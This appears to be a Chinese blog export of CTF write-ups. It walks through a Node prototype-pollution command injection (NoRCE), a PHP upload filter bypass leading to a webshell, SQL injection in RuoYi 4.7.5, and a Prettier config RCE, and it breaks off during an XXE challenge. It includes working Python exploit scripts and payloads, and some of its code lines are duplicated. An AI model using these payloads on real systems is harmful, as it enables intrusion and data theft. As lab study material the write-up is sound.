&#125;\n&#125;)\nconst port = process.env.PORT || 3000\nconst host = process.env.HOST || \"0.0.0.0\"\nconst respWrapper = &#123;\n    $id: &#x27;respWrapper&#x27;,\n    type: &#x27;object&#x27;,\n    response : &#123;\n        success: &#123;\n            type: &#x27;object&#x27;,\n            properties: &#123;\n                status : &#123; type: &#x27;number&#x27; &#125;,\n                info: &#123; type: &#x27;string&#x27; &#125;,\n            &#125;\n        &#125;\n    &#125;\n&#125;\n\nfastify.addSchema(respWrapper)\nfastify.register(userRoutes)\n\nfastify.listen(&#123;\n    host, port\n&#125;, (err, address) => &#123;\n    if (err) &#123;\n        fastify.log.error(err)\n        process.exit(1)\n    &#125;\n    fastify.log.info(`server listening on $&#123;address&#125;`)\n&#125;)\n\n发现网站还有个路由/user\nconst userRoutes = require(const userRoutes = require(&#x27;./routes/user&#x27;)\n\n访问\n\n显示\n&#123;&quot;message&quot;:&quot;Route GET:/user not found&quot;,&quot;error&quot;:&quot;Not Found&quot;,&quot;statusCode&quot;:&#123;&quot;message&quot;:&quot;Route GET:/user not found&quot;,&quot;error&quot;:&quot;Not Found&quot;,&quot;statusCode&quot;:404&#125;\n\n看样子是无法用GET方式访问/user路由\n于是审计一下user.js\nuser.jsconst merge = require(const merge = require(&#x27;../utils/merge&#x27;)\nconst bin = \"/bin/bash\"\nconst ChildProcess = require(&#x27;child_process&#x27;);\n\nfunction checkUser(command)&#123;\n    if (Array.isArray(command) === false || command.length > 2) &#123;\n        return false;\n    &#125;\n    for (let i = 0; i length; i++) &#123;\n        let cmd = command[i];\n        if (typeof cmd !== &#x27;string&#x27; || cmd.length > 4 || RegExp(/^[^a-zA-Z0-9-]+$/).test(command[i])) &#123;\n            return false;\n        &#125;\n    &#125;\n    return true;\n&#125;\n\nasync function routes (fastify, options) &#123;\n    fastify.route(\n        &#123;\n            method: &#x27;POST&#x27;,\n            url: &#x27;/user&#x27;,\n            schema: &#123;\n                querystring: &#123;\n                    user: &#123; type: &#x27;string&#x27; &#125;,\n                &#125;,\n                additionalProperties: false,\n                response: &#123;\n                    200: &#123;\n                        $ref: &#x27;respWrapper#/response/success&#x27;\n                    &#125;\n                &#125;\n            &#125;,\n            preHandler: function (request, reply, done) &#123;\n                //user init\n                request.user = &#123;username : &#x27;guest&#x27;, command: [\"-c\", \"id\"]&#125;\n                let user = JSON.parse(request.body.user)\n                // clean user command\n                if (checkUser(user.command) !== true) &#123;\n                    user.command = [\"-c\", \"id\"]\n                &#125;\n                try &#123;\n                    merge(request.user, user)\n                &#125;catch (e)&#123;\n                    reply.code(400).send(&#123;status: 1, info: \"Something error\"&#125;)\n                    return ;\n                &#125;\n                done()\n            &#125;,\n            handler : function (request, reply) &#123;\n                ChildProcess.execFile(bin, request.user.command, (error, stdout, stderr) => &#123;\n                    if (error) &#123;\n                        reply.code(400).send(&#123;status: 1, info: error&#125;)\n                    &#125;\n                    reply.code(200).send(&#123; status : 0 , info : `User of $&#123;request.user.username&#125; : $&#123;stdout&#125;`&#125;);\n                &#125;);\n            &#125;\n        &#125;)\n    fastify.route(&#123;\n        method: &#x27;GET&#x27;,\n        url: &#x27;/&#x27;,\n        response: &#123;\n            $ref: &#x27;respWrapper#/response/success&#x27;\n        &#125;,\n        handler: function (request, reply) &#123;\n            reply.send(&#123; status: 0, info: &#x27;go user&#x27; &#125;)\n        &#125;\n    &#125;)\n&#125;\n\nmodule.exports = routes\n\n原型链污染重点看merge和JSON.parse，发现代码，\nlet user = JSON.parse(request.body.let user = JSON.parse(request.body.user)\n\n\n\ntry &#123;\n    merge(request.user, user)\n&#125;catch (e)&#123;\n    reply.code(400).send(&#123;status: 1, info: \"Something error\"&#125;)\n    return ;\n&#125;\n\n其中request.user的值为，\nrequest.user = &#123;username : &#x27;guest&#x27;, command: [&quot;-c&quot;, request.user = &#123;username : &#x27;guest&#x27;, command: [&quot;-c&quot;, \"id\"]&#125;\n\n而user的值为，\nlet user = JSON.parse(request.body.let user = JSON.parse(request.body.user)\n\nrequest.user是初始化的user，所以无法直接污染，但是user是从请求体中得到的数据，并且通过Json格式化，其中是可以加一些实体（如__proto__,constructor.prototype）进去，是可以被我们污染的，所以，我们可以先污染user，然后通过merge合并，将user中的值传入request.user中\n然后我们可以看看merge的内容，\nmerge.jsconst whileTypes = [&#x27;boolean&#x27;, &#x27;string&#x27;, &#x27;number&#x27;, &#x27;bigint&#x27;, &#x27;symbol&#x27;, const whileTypes = [&#x27;boolean&#x27;, &#x27;string&#x27;, &#x27;number&#x27;, &#x27;bigint&#x27;, &#x27;symbol&#x27;, &#x27;undefined&#x27;];\n\nconst merge = (target, source) => &#123;\n    for (const key in source) &#123;\n        if(!whileTypes.includes(typeof source[key]) && !whileTypes.includes(typeof target[key]))&#123;\n            if(key !== &#x27;__proto__&#x27;)&#123;\n                merge(target[key], source[key]);\n            &#125;\n        &#125;else&#123;\n            target[key] = source[key];\n        &#125;\n    &#125;\n&#125;\n\nmodule.exports = merge\n\n发现merge对内容进行了过滤和检查，\n\n如果request.user或user中，有包含whileTypes中的内容，就不会执行merge\n如果键值中有__proto__，也不会执行merge\n\n过滤关键字还好，只是过滤了__proto__，需要一个相同功能的来帮助绕过，比如constructor.prototype\n但是在merge前面还要个checkUser，将command也进行了限制\nfunction checkUser(function checkUser(command)&#123;\n    if (Array.isArray(command) === false || command.length > 2) &#123;\n        return false;\n    &#125;\n    for (let i = 0; i length; i++) &#123;\n        let cmd = command[i];\n        if (typeof cmd !== &#x27;string&#x27; || cmd.length > 4 || RegExp(/^[^a-zA-Z0-9-]+$/).test(command[i])) &#123;\n            return false;\n        &#125;\n    &#125;\n    return true;\n&#125;\n\n由条件语句可知，要求command必须是数组且数组中元素个数要小于等于2，\n且要求command数组中的元素必须为字符串且长度要小于等于4，并以字母或者数字或者-开头\n如果不满足checkUser，就会执行：\nuser.command = [&quot;-c&quot;, user.command = [&quot;-c&quot;, \"id\"]\n\n将command直接赋值为执行id命令，而不能执行其他命令。\n&#x3D;&#x3D;&gt;再由初始化request.user，所以最后构造request.body.user的结构应该为\n&#123;&quot;user&quot;:&quot;&#123;&quot;username&quot;:&quot;guest&quot;,&quot;command&quot;:[&quot;-c&quot;,&quot;id&quot;]&#125;&quot;&#123;&quot;user&quot;:&quot;&#123;&quot;username&quot;:&quot;guest&quot;,&quot;command&quot;:[&quot;-c&quot;,&quot;id&quot;]&#125;&quot;&#125;\n\n只是我们想要执行的command是cat /flag，但是很明显我们长度限制过不了，所以如果想要执行命令是不能把值写到command中，不然肯定会被拦截\n我们看看user.js中，是如何执行command的，\nhandler : function (handler : function (request, reply) &#123;\n                ChildProcess.execFile(bin, request.user.command, (error, stdout, stderr) => &#123;\n                    if (error) &#123;\n                        reply.code(400).send(&#123;status: 1, info: error&#125;)\n                    &#125;\n                    reply.code(200).send(&#123; status : 0 , info : `User of $&#123;request.user.username&#125; : $&#123;stdout&#125;`&#125;);\n                &#125;);\n            &#125;\n\n发现它执行是执行request.user.command的内容，那便又回到污染user，然后再通过merge污染request.user，所以这里尝试污染request.user的实体中的command参数\n\n\n\n\n\n\n\n\n\n但是，request.user在执行merge之前就已经有command值[&quot;-c&quot;,&quot;id&quot;],所以作为一个已经存在的参数，就算污染了实体，它查找调用时还是会以它自己已有的值为先，所以如下图\n\n我们仔细执行命令的代码，发现它是将 request.user.command这个数组直接接到 /bin/bash后面\n构造成\n/bin/bash -c /bin/bash -c id\n\n这种命令。\n但是突然想到一点，既然无法直接污染实体修改已有参数，那么如果在command数组中再加一个键值2，并且也是命令，能否也成功执行呢？\n我们本地可以先测试一下，\nimport requests\nurl=\"http://127.0.0.1:3000/user\"\nuser=&#x27;&#x27;&#x27;&#123;\"username\":\"ttoc\",\"constructor\":&#123;\"prototype\":&#123;\"2\":\"whoami\"&#125;&#125;,\"command\":[\"-c\",\"id\"]&#125;&#x27;&#x27;&#x27;\nprint(requests.post(url=url, json=&#123;\"user\": user&#125;).text)\n\n只看调试结果，command数组的变化\n开始都是一样的，再加上这里的command数组符合checkUser的要求，通过\n\n当运行到key为prototype时，\n\n可以看到target，也就是request.user，也获得了一个属性2且值为whoami的，说明污染成功\n\n继续看对command数组的影响，虽然两者command数组一样，但是后面就会出现区别\n\n发现在不断的merge合并时，user和request.user中两者的数组中的key也在比较，但是由于两者的command数组中是字符串，属于whileTypes，所以会直接将target[key] = source[key];，也就是将user中值赋值给request.user，也就是修改command值\nconst whileTypes = [&#x27;boolean&#x27;, &#x27;string&#x27;, &#x27;number&#x27;, &#x27;bigint&#x27;, &#x27;symbol&#x27;, const whileTypes = [&#x27;boolean&#x27;, &#x27;string&#x27;, &#x27;number&#x27;, &#x27;bigint&#x27;, &#x27;symbol&#x27;, &#x27;undefined&#x27;];\nif(!whileTypes.includes(typeof source[key]) && !whileTypes.includes(typeof target[key]))&#123;\n            if(key !== &#x27;__proto__&#x27;)&#123;\n                merge(target[key], source[key]);\n            &#125;\n&#125;else&#123;\n    target[key] = source[key];\n&#125;\n\n由于key=0和key=1两者都一样都是-c,id，所以赋值没有变化\n\n当key=2时，因为之前执行prototype时，使得request.user也有属性2这个值，\n\n虽然这个属性2是在Object中，但是是在Array之上，所以即便command数组中没有key&#x3D;2，但是仍然就会从原型链中寻找，所以当再次运行到target[key] = source[key];时，属性2就被当作command的属性2，赋值进去了\n\n于是最后执行命令时就是，\n/bin/bash -c id /bin/bash -c id whoami\n\n由这个现象便可以构造出payload，可以看到便得到flag{test}\nimport requests\nurl=\"http://172.28.31.86:3000/user\"\nuser=&#x27;&#x27;&#x27;&#123;\"username\":\"ttoc\",\"constructor\":&#123;\"prototype\":&#123;\"2\":\"cat /flag\"&#125;&#125;,\"command\":[\"-c\",\"-i\"]&#125;&#x27;&#x27;&#x27;\nprint(&#123;\"user\":user&#125;)\nprint(requests.post(url=url, json=&#123;\"user\": user&#125;).text)\n\n\n当然这只是一个，同理，既然限制command数组中元素个数要小于等于2，所以一个也是可以的\n# http:# http://172.28.31.86:3000/user\nimport requests\nurl=\"http://172.28.31.86:3000/user\"\nuser=&#x27;&#x27;&#x27;&#123;\"username\":\"ttoc\",\"constructor\":&#123;\"prototype\":&#123;\"1\":\"cat /flag\"&#125;&#125;,\"command\":[\"-c\"]&#125;&#x27;&#x27;&#x27;\nprint(&#123;\"user\":user&#125;)\nprint(requests.post(url=url, json=&#123;\"user\": user&#125;).text)\n\n结果同上，只是不能让command为空就行，不然会报错\n\n直接浏览器console，展示也可以理解原理\n\n这里的属性2实际是在command实体中\n\nNoRCE","slug":"2022强网拟态","date":"2023-02-13T15:23:35.802Z","categories_index":"网络安全学习","tags_index":"Game","author_index":"Ttoc"},{"id":"5989226e724dd04d4cb9a6777f53450e","title":"2022RCTF","content":"学到很多\n\n\nRCTF2022easyupload\n\n\n\n\n\n\n\n\n附件\nhttps://adworld.xctf.org.cn/media/file/task/0e2ca001-097f-437c-b5ae-a9e04773b9bc.tar\n\n这是一个文件上传的题目，题目开始给出了题目附件，先查看一下源码查看上传文件过滤哪些东西\n核心就是一个UploadController.php文件\n\nnamespace App\\Controller;\nuse Symfony\\Component\\Filesystem\\Path;\nuse Symfony\\Component\\HttpFoundation\\Request;\nuse Symfony\\Component\\HttpFoundation\\Response;\nuse Symfony\\Component\\Routing\\Annotation\\Route;\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n\nclass UploadController extends AbstractController\n&#123;\n    public function __construct()\n    &#123;\n        mb_detect_order([\"BASE64\",\"ASCII\",\"UTF-8\"]);\n        $this->ext_blacklist = [\n            \"php\",\n            \"ini\",\n            \"phtml\",\n            \"htaccess\",\n        ];\n        $this->content_blacklist = [\", \"php\", \"handler\"];\n    &#125;\n    public function invalid($msg)&#123;\n        return new Response(\"error occurs: $msg\");\n    &#125;\n    #[Route(&#x27;/&#x27;, name: &#x27;upload&#x27;)]\n    public function index(Request $request)\n    &#123;\n        $uploadHtml = \n\n\n  \n  \n\n\nEOF;\n\n        $file = @$_FILES[\"file\"];\n        if($file == null)&#123;\n            return new Response(\n                //&#x27;Before start you should know that it\\&#x27;s not a good challenge.You can\\&#x27;t get anything from this challenge.If you hate this challenge, just skip plz. 这道题并不是一道好题，你不会从这道题上获得任何东西。如果你讨厌这道题就直接跳过吧。&#x27;\n                $uploadHtml\n            );\n        &#125;else &#123;\n\n            $content = file_get_contents($file[\"tmp_name\"]);\n            $charset = mb_detect_encoding($content, null, true);\n            if(false !== $charset)&#123;\n                if($charset == \"BASE64\")&#123;\n                    $content = base64_decode($content);\n                &#125;\n                foreach ($this->content_blacklist as $v) &#123;\n                    if(stristr($content, $v)!==false)&#123;\n                        return $this->invalid(\"fucking $v .\");\n                    &#125;\n                &#125;\n            &#125;else&#123;\n                return $this->invalid(\"fucking invalid format.\");\n            &#125;\n            $ext = Path::getExtension($file[\"name\"], true);\n            if(strstr($file[\"name\"], \"..\")!==false)&#123;\n                return $this->$this->invalid(\"fucking path travel\");\n            &#125;\n            foreach ($this->ext_blacklist as $v)&#123;\n                if (strstr($ext, $v) !== false)&#123;\n                    return $this->invalid(\"fucking $ext extension.\");\n                &#125;\n            &#125;\n            $dir = dirname($request->server->get(&#x27;SCRIPT_FILENAME&#x27;));\n\n            $result = move_uploaded_file($file[\"tmp_name\"], \"$dir/upload/\".strtolower($file[\"name\"]));\n            if($result)&#123;\n                return new Response(\"upload success\");\n            &#125;else &#123;\n                return new Response(\"upload failed\");\n            &#125;\n        &#125;\n    &#125;\n&#125;\n\n可以看到过滤包含了后缀过滤和文件内容过滤\npublic function __construct(public function __construct()\n    &#123;\n        mb_detect_order([\"BASE64\",\"ASCII\",\"UTF-8\"]);\n        $this->ext_blacklist = [\n            \"php\",\n            \"ini\",\n            \"phtml\",\n            \"htaccess\",\n        ];\n        $this->content_blacklist = [\", \"php\", \"handler\"];\n    &#125;\n\n\n\n\n\n\n\n\n\n\n后缀名黑名单过滤代码，过滤了php,ini,phtml,htaccess\nif(strstr($file[&quot;name&quot;], &quot;..&quot;)!==if(strstr($file[&quot;name&quot;], &quot;..&quot;)!==false)&#123;\n          return $this->$this->invalid(\"fucking path travel\");\n      &#125;\n      foreach ($this->ext_blacklist as $v)&#123;\n          if (strstr($ext, $v) !== false)&#123;\n              return $this->invalid(\"fucking $ext extension.\");\n          &#125;\n      &#125;\n\n可以看到这里的这里是用strstr()进行匹配，而strstr()是区分大小写的，所以这里可以用.pHp，或者.PHP进行绕过对.php的过滤\n$result = move_uploaded_file($file[&quot;tmp_name&quot;],&quot;$dir/upload/&quot;.strtolower($file[$result = move_uploaded_file($file[&quot;tmp_name&quot;],&quot;$dir/upload/&quot;.strtolower($file[\"name\"]));\n\n代码最后可以看到后缀名被strtolower()处理，转化为小写，但是这里已经不影响，因为前面已经绕过了过滤\n\n\n\n\n\n\n\n\n\n文件内容黑名单明确了&quot;&lt;?&quot;, &quot;php&quot;, &quot;handler&quot;\n可以看到代码中对文件内容的判断，其中涉及了mb_detect_encoding()函数\n\nmb_detect_encoding()：从有序的候选列表中 检测字符串 最可能的字符编码。\nmb_detect_encoding(string $string, array|string|null $encodings = null, bool $strict = false): string|mb_detect_encoding(string $string, array|string|null $encodings = null, bool $strict = false): string|false\n\n$strict控制在列出的任何编码中字符串无效时的行为。如果strict设置为false，则返回最接近的匹配编码;如果strict设置为true，则返回false。\n当$encodings省略或者为空时，会从mb_detect_order()中按顺序进行测试\n该题代码中为mb_detect_order([&quot;BASE64&quot;,&quot;ASCII&quot;,&quot;UTF-8&quot;]);\n$content = file_get_contents($file[$content = file_get_contents($file[\"tmp_name\"]);\n           $charset = mb_detect_encoding($content, null, true);\n           if(false !== $charset)&#123;\n               if($charset == \"BASE64\")&#123;\n                   $content = base64_decode($content);\n               &#125;\n               foreach ($this->content_blacklist as $v) &#123;\n                   if(stristr($content, $v)!==false)&#123;\n                       return $this->invalid(\"fucking $v .\");\n                   &#125;\n               &#125;\n           &#125;else&#123;\n               return $this->invalid(\"fucking invalid format.\");\n           &#125;\n\n这段代码的判断主要是有个charset的判断, 如果 mb_detect_encoding() 的结果不为空【false !== $charset】, 就会对文件内容进行判断，而当为空时【false == $charset】，就会直接返回退出\nif($charset == if($charset == \"BASE64\")&#123;\n    $content = base64_decode($content);\n&#125;\nforeach ($this->content_blacklist as $v) &#123;\n    if(stristr($content, $v)!==false)&#123;\n        return $this->invalid(\"fucking $v .\");\n    &#125;\n&#125;\n\n而且在这段代码中有显示，不仅需要$charset不为空，还需要$charset==&quot;BASE64&quot;\n判断完$charset后，又对内容进行正则匹配，如果出现，就会失败了，所以需要在\n\n这里匹配内容的代码为stristr($content, $v)!==false\nstristr\n\n知识点\n\n\n\n\n\n\n\n\nhttps://github.com/php/php-src/issues/9008\n它会导致奇怪的结果。\n\n$string = \"PHP\";\n\nmb_detect_order([\"ASCII\",\"UTF-8\",\"BASE64\"]);\nvar_dump(\nmb_detect_encoding($string, null, true),\nmb_detect_encoding($string, mb_detect_order(), true),\n\nmb_convert_encoding($string, \"UTF-8\", \"BASE64\"),\nmb_strtolower($string, \"BASE64\"),\n?>\n\n得到的结果发现\nOutput for 8.2Output for 8.2.0\nstring(5) \"ASCII\"\nstring(5) \"ASCII\"\nstring(2) \"\nstring(4) \"PHM=\"\n\nOutput for 8.0.1 - 8.0.26, 8.1.10 - 8.1.13\nstring(5) \"ASCII\"\nstring(5) \"ASCII\"\nstring(2) \"\nstring(4) \"PHM=\"\n\nOutput for 8.1.0 - 8.1.9\nstring(6) \"BASE64\"\nstring(5) \"ASCII\"\nstring(2) \"\nstring(4) \"PHM=\"\n\nmb_detect_encoding($string, null, true)返回值\n只有在PHP版本在8.1.0 - 8.1.9时会返回base64，而在其他版本都是默认识别为ASCII\n查看返回包中数据可知\nHTTP/1.1 200 OK\nDate: Sun, 22 Jan 2023 08:40:35 GMT\nServer: Apache/2.4.54 (Debian)\nX-Powered-By: PHP/8.1.9\nCache-Control: no-cache, private\nVary: Accept-Encoding\nConnection: close\nContent-Type: text/html; charset=UTF-8\nContent-Length: 14\n\n正好是8.1.0 - 8.1.9版本\nlibmbfl打分\n\n\n\n\n\n\n\n\n所以实现&#96;&#96;$charset &#x3D;&#x3D; BASE64&#96;，只要文件内容前面数据让它识别为base64即可\n那么如何让其认为是base64呢？\n这就涉及到libmbfl的打分，libmbfl是mb扩展\nhttps://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225\n我的理解就是类似像checkengine，比如mb_detect_encoding()这类的函数对内容进行编码的识别，就是匹配内容中的一些符合编码的字符，匹配成功对应编码加分，最后从头到尾匹配完成后，打分最高的编码就被认为是该内容的编码\n这是打分判断\n\n\n\n\n\n\n\n\n\n0xFFFF是-1，&gt;&#x3D;0 \n\n0x21是33 33对应!\n0x2F是47 47对应&#x2F;\n47&gt;=c&gt;=33\n/打分打的多，所以可以在一句话🐎前加入许多/\n\n\n这是mb_encoding_detect()返回判断得到编码类型的逻辑\n\n\n\n\n\n\n\n\n\n因为mb_detect_order([&quot;BASE64&quot;,&quot;ASCII&quot;,&quot;UTF-8&quot;]);，所以按照得分匹配，如果是想要返回base64，就需要内容中base64得分最高，才可以实现返回为base64\n\n综上\n\n\n\n\n\n\n\n\n上传的文件需要满足\n1.后缀不能为.php等，可以为大小写混写或者纯大写，如.pHp，.PHP等等\n2.文件内容前面需要可以被识别为base64，而后面的过滤的内容其实就不用考虑了，因为在判断前经过\n$content=base64_decode($content)\n\n可以发现原来的内容在被解码后，发生了变化，结果转化为乱码，于是绕过了黑名单过滤\n【当然前提是$charset == BASE64，也就是打分够了】\n于是最后的文件内容为\n\n访问1.PHP\n\n拿蚁剑连接\n\n最后得到flag\n\nezruoyi\n\n\n\n\n\n\n\n\nhint:RuoYi v4.7.5\n\n\n\n\n\n\n\n\n\n附件：\nhttps://drive.google.com/file/d/1vd8-tzGCX5Nra2vNTvJerjyW4KQDaAtE/view?usp=sharing\nor\nhttps://share.weiyun.com/wCvo3QJ0\n\n\n\n\n\n\n\n\n\n\n什么是RuoYi？\nRuoYi是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、通知公告等。\n这个ruoyi v4.75是一个0day题目\n搭建本地环境有问题，只有看看源码和师傅们的wp总结一下\n\n先进行信息收集，根据hint，查找ruoyiv 4.75以及其之前的常出现的漏洞点\nhttps://cn-sec.com/archives/1256773.html\nhttps://www.freebuf.com/articles/web/304666.html\n这两篇文章提到Ruoyi&lt;=4.6.1存在后台sql注入漏洞\n对ruoyi-admin.jar包进行查找，\n在 ruoyi-generator-4.7.5.jar找到GenTablrServiceImpl.class\n\n其中的sql语句为\npublic AjaxResult createpublic AjaxResult create(String sql) &#123;\n  try &#123;\n    SqlUtil.filterKeyword(sql);\n    List sqlStatements = SQLUtils.parseStatements(sql, DbType.mysql);\n    List tableNames = new ArrayList<>();\n    for (SQLStatement sqlStatement : sqlStatements) &#123;\n      if (sqlStatement instanceof MySqlCreateTableStatement) &#123;\n        MySqlCreateTableStatement createTableStatement = (MySqlCreateTableStatement)sqlStatement;\n        if (this.genTableService.createTable(createTableStatement.toString())) &#123;\n          String tableName = createTableStatement.getTableName().replaceAll(\"`\", \"\");\n          tableNames.add(tableName);\n        &#125; \n      &#125; \n    &#125; \n    List tableList = this.genTableService.selectDbTableListByNames(tableNames.toArray(new String[tableNames.size()]));\n    String operName = Convert.toStr(PermissionUtils.getPrincipalProperty(\"loginName\"));\n    this.genTableService.importGenTable(tableList, operName);\n    return AjaxResult.success();\n  &#125; catch (Exception e) &#123;\n    this.logger.error(e.getMessage(), e);\n    return AjaxResult.error(\"创建表结构异常[\" + e.getMessage() + \"]\");\n  &#125; \n&#125;\n\n发现sql注入过滤判断，跟进SqlUtil\nSqlUtil.filterKeyword(sql);\n\n得到\npackage com.ruoyi.common.utils.sql;\n\nimport com.ruoyi.common.exception.UtilException;\nimport com.ruoyi.common.utils.StringUtils;\n\npublic class SqlUtil &#123;\n  public static String SQL_REGEX = \"select |insert |delete |update |drop |count |exec |chr |mid |master |truncate |char |and |declare \";\n  \n  public static String SQL_PATTERN = \"[a-zA-Z0-9_\\\\ \\\\,\\\\.]+\";\n  \n  public static String escapeOrderBySql(String value) &#123;\n    if (StringUtils.isNotEmpty(value) && !isValidOrderBySql(value))\n      throw new UtilException(\"); \n    return value;\n  &#125;\n  \n  public static boolean isValidOrderBySql(String value) &#123;\n    return value.matches(SQL_PATTERN);\n  &#125;\n  \n  public static void filterKeyword(String value) &#123;\n    if (StringUtils.isEmpty(value))\n      return; \n    String[] sqlKeywords = StringUtils.split(SQL_REGEX, \"\\\\|\");\n    for (String sqlKeyword : sqlKeywords) &#123;\n      if (StringUtils.indexOfIgnoreCase(value, sqlKeyword) > -1)\n        throw new UtilException(\"); \n    &#125; \n  &#125;\n&#125;\n\n看到正则过滤了很多\npublic static String SQL_REGEX = public static String SQL_REGEX = \"select |insert |delete |update |drop |count |exec |chr |mid |master |truncate |char |and |declare \";\n\n开始还以为直接堵死了，但是它实际过滤的是select_(空格)，而非过滤了select，用select/**/可以进行绕过\nhttps://gitee.com/y_project/RuoYi/pulls/403\n\n在其master分支进行了pull request，对此处进行了修改，但是在main分支仍然存在旧代码的漏洞，所以仍然是可以利用的\n而且分析前面方法\nsqlStatement instanceof MySqlCreateTableStatement\n\n知道该方法是在create的时候触发，会先进行解析sql语句，然后进行创建表，如果创建表成功，则将表名添加到列表中\n那么在一个创建表的sql语句中我们如何让它回显出我们需要的内容呢，\n关键就在这里抛出异常\ncatch (Exception e) &#123;\n      this.logger.error(e.getMessage(), e);\n      return AjaxResult.error(\"创建表结构异常[\" + e.getMessage() + \"]\");\n    &#125;\n\n所以构造一个报错的表，且让其中包含flag数据\n&#x3D;&gt;用报错注入查询flag的数据，然后把数据导入到创建的新表中去\n所以于是根据构造\n在网站/tool/gen/createTable以post方式提交sql语句\n【注意表名不能和数据库已经有的表名相同否则会创建表失败】\nsql=create table a as select/**/updatexml(0x7e,(select/**/flag from flag),sql=create table a as select/**/updatexml(0x7e,(select/**/flag from flag),0x7e)\n\n\nPrettierOnline\n\n\n\n\n\n\n\n\nhint:Prettier my(not your) code\n附件：https://adworld.xctf.org.cn/media/file/task/edc2b784-4b87-4b94-800f-1dc4fc61060e.tar\n\n\n\n\n\n\n\n\n\n什么是Prettier？\n一个“有态度”的代码格式化工具\n这个环境也有点问题，虽然能够完成搭建并且访问，但是调用Prettier时，对于身份的验证一直提示\n\n猜测是不是Prettier官方对公开可调用api进行了修改，导致在此题容器中无法运行Prettier\n只能记一下其他师傅的wp的知识点了【下次一定要现场搞出来，事后搞确实烦人\n\n这个题的思路有点头疼\n这是官方配置文件介绍https://prettier.io/docs/en/configuration.html\n先看看环境文件，之前没学过node.js这次学习一下\nindex.js分析加在注释\n// 引入文件系统、加密、格式化工具、进程控制等模块\nconst fs = require(&#x27;fs&#x27;)\nconst crypto = require(&#x27;crypto&#x27;)\nconst prettier = require(&#x27;prettier&#x27;)\nconst &#123; nextTick, exit &#125; = require(&#x27;process&#x27;)\n\n// 引入自定义的 fw 模块\nrequire(&#x27;./fw&#x27;)\n\n// 从文件 ./dist/id 中读取一个字符串，然后使用 trim() 方法去除两端的空格\nconst id = fs.readFileSync(&#x27;./dist/id&#x27;, &#x27;utf-8&#x27;).toString(&#x27;utf-8&#x27;).trim()\n\n // 删除文件 ./dist/id\nfs.unlinkSync(&#x27;./dist/id&#x27;)\n\n // 调用 prettier.resolveConfig 方法，异步地读取和解析 .prettierrc 配置文件，然后使用该配置文件格式化代码\n//$&#123;__dirname&#125;是node.js的一个特殊变量，用于读取当前模块所在的目录的绝对路径\nprettier.resolveConfig(`$&#123;__dirname&#125;/.prettierrc`).then(config => &#123;\n    \n   // 格式化当前文件的代码\n  const ret = prettier.format(fs.readFileSync(__filename, &#x27;utf-8&#x27;), config)\n\n  // 使用 SHA256 算法计算 id 的哈希值，并以十六进制格式输出为字符串\n  const o = crypto.createHash(&#x27;sha256&#x27;).update(Buffer.from(id, &#x27;utf-8&#x27;)).digest().toString(&#x27;hex&#x27;)\n  \n   // 将 id 作为文件名写入 dist 目录下\n  fs.writeFileSync(`./dist/$&#123;id&#125;`, o, &#x27;utf-8&#x27;)\n  \n   // 将格式化后的代码写入文件 ./dist/ret.js 中\n  fs.writeFileSync(&#x27;./dist/ret.js&#x27;, ret, &#x27;utf-8&#x27;)\n    \n  // 使用 nextTick 方法注册一个回调函数跑出一个错误\n  nextTick(() => &#123;\n    throw new Error(&#x27;No NextTick here!&#x27;)\n  &#125;)\n    \n  exit(0)\n&#125;)\n\n主要是对一个文件进行格式化、哈希计算并生成新的文件。\n在这段代码中我们发现\nresolveConfig(`$&#123;__dirname&#125;/.prettierrc`)\n\n.prettierrc文件实际上是不在当前目录，也就是说还未生成，那么我们利用其自身格式代码，让其加载我们自己的设置配置信息，实现想要的命令执行等等操作\nfw.jsconst Module = require(const Module = require(&#x27;module&#x27;)\nconst oldRequire = Module.prototype.require\nModule.prototype.require = function (id) &#123;\n  if (typeof id !== &#x27;string&#x27;) &#123;\n    throw new Error(&#x27;Bye&#x27;)\n  &#125;\n  const isCore = Module.isBuiltin(id)\n  if (isCore) &#123;\n    if (!/fs|path|util|os/.test(id)) &#123;\n      throw new Error(&#x27;Bye, &#x27; + id)\n    &#125;\n  &#125; else &#123;\n    id = Module._resolveFilename(id, this)\n  &#125;\n  return oldRequire.call(oldRequire, id)\n&#125;\nprocess.dlopen = () => &#123;&#125;\n\n看起来是对参数进行过滤的一个模块，首先判断参数id是否为字符串类型，如果不是，则会抛出一个错误。\n!/fs|path|util|os/.!/fs|path|util|os/.test(id))\n\n这里用test(id),如果id是一个Node.js的核心模块，如fs、path、util或os等，则允许加载该模块，否则也会抛出一个错\n误\n另外，process.dlopen被重写为空函数，代表无法使用process.dlopen加载新的本地模块\n\n\n\n\n\n\n\n\n\nprocess.dlopen是Node.js的一个C++层面的函数，用于在Node.js进程中动态加载本地模块\njs payload&#123;\n    //解析.prettierrc\n  parser: \".prettierrc\",\n  /x|x/.__proto__.test=()=>true,\n  module.exports=()=>require(\"child_process\").execSync(\"pwd;cat flag\").toString()\n&#125;\n// Hook RegExp.prototype.test\n\n\n\n\n\n\n\n\n\n\n这段代码的目的就是因为在目录下并没有.prettierrc配置文件，所以利用解析器解析.prettierrc，\n那么\n/x|x/.__proto__.test=()=>true,\nmodule.exports=()=>require(\"child_process\").execSync(\"pwd;cat flag\").toString()\n\n中的内容就会被当作.prettierrc文件的内容，然后在index.js中进行解析，从而执行命令\n\n\n\n\n\n\n\n\n\nparser: &quot;.prettierrc&quot;：设置 Prettier 的解析器为 .prettierrc，这意味着 Prettier 会读取和解析 .prettierrc 文件来获取格式化选项。\n/x|x/.__proto__.test=()=&gt;true：通过修改 RegExp 对象的原型来劫持所有正则表达式的 test() 方法，使其始终返回为true这样就可以使得id绕过fw.js的过滤了，使得可以require任何东西，以至于child_process，正则表达式 /x|x/ 可以匹配任何字符串。\nmodule.exports=()=&gt;require(&quot;child_process&quot;).execSync(&quot;pwd;cat flag&quot;).toString()：将 module.exports 设置为一个匿名函数，该函数调用一个子进程child_process，然后调用execSync 方法来执行命令 pwd;cat flag，并将当前目录flag作为字符串返回。\nezbypass\n\n\n\n\n\n\n\n\nhint:xxe me,尝试编码绕过 xxe 过滤器\n\n这是一道xxe的题目，对内容进行了过滤，可以对过滤内容进行编码绕过过滤达到文件内容读取的目的\n反汇编jar包，\n在com.example.demo.filter.MyFilter\n  public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)   public void doFilter(ServletRequest request, ServletResponse response, 